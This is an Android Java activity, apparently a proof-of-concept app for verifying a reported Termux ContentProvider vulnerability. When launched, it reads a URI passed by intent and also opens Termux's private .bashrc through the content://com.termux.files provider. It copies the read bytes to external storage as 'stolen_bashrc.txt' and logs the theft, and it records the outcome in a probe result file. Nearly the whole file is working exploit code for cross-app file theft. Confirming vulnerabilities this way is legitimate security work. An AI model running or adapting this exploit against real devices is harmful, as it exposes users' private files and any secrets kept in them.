package com.test.malicious;

import android.app.Activity;
import android.os.Bundle;
import android.net.Uri;
import android.content.Intent;
import android.util.Log;
import android.os.Environment;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity {
    private static final String TAG = "MaliciousTestApp";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String uriStr = getIntent() != null ? getIntent().getStringExtra("uri") : null;
        boolean success = false;
        String status = "NO_URI";
        int bytes = 0;
        
        // Try to exploit the Termux ContentProvider vulnerability directly
        if (uriStr != null && !uriStr.trim().isEmpty()) {
            try {
                Uri uri = Uri.parse(uriStr);
                InputStream is = getContentResolver().openInputStream(uri);
                if (is != null) {
                    byte[] buf = new byte[1024];
                    int n = is.read(buf);
                    if (n > 0) {
                        success = true;
                        bytes = n;
                        status = "OK";
                    } else {
                        status = "EMPTY";
                    }
                    is.close();
                } else {
                    status = "NULL_STREAM";
                }
            } catch (SecurityException se) {
                Log.w(TAG, "SecurityException: " + se.getMessage());
                status = "SECURITY_EXCEPTION";
            } catch (Exception e) {
                Log.w(TAG, "Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
                status = "ERROR";
            }
        }
        
        // Also try to exploit the vulnerability by reading Termux files directly
        // This is the actual exploit described in the vulnerability report
        try {
            // Try to read .bashrc file through Termux ContentProvider
            Uri termuxUri = Uri.parse("content://com.termux.files/data/data/com.termux/files/home/.bashrc");
            InputStream termuxIs = getContentResolver().openInputStream(termuxUri);
            if (termuxIs != null) {
                byte[] buf = new byte[4096];
                int n = termuxIs.read(buf);
                if (n > 0) {
                    success = true;
                    bytes = n;
                    status = "TERMUX_EXPLOIT_SUCCESS";
                    
                    // Write the stolen data to external storage (as in the PoC)
                    File outFile = new File(Environment.getExternalStorageDirectory(), "stolen_bashrc.txt");
                    FileOutputStream fos = new FileOutputStream(outFile);
                    fos.write(buf, 0, n);
                    fos.close();
                    
                    Log.d(TAG, "Successfully exploited Termux vulnerability! Stole " + n + " bytes");
                }
                termuxIs.close();
            } else {
                if (status.equals("NO_URI")) {
                    status = "TERMUX_ACCESS_DENIED";
                }
            }
        } catch (SecurityException se) {
            Log.w(TAG, "Termux SecurityException: " + se.getMessage());
            if (status.equals("NO_URI")) {
                status = "TERMUX_SECURITY_EXCEPTION";
            }
        } catch (Exception e) {
            Log.w(TAG, "Termux Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            if (status.equals("NO_URI")) {
                status = "TERMUX_ERROR";
            }
        }

        writeEvidence(success, status, bytes);
        finish();
    }

    private void writeEvidence(boolean success, String status, int bytes) {
        try {
            File out = new File(getFilesDir(), "probe_result.txt");
            FileOutputStream fos = new FileOutputStream(out, false);
            String s = "SUCCESS=" + success + "\n" +
                       "STATUS=" + status + "\n" +
                       "BYTES_READ=" + bytes + "\n";
            fos.write(s.getBytes());
            fos.flush();
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "Failed to write evidence: " + e.getMessage());
        }
    }
}
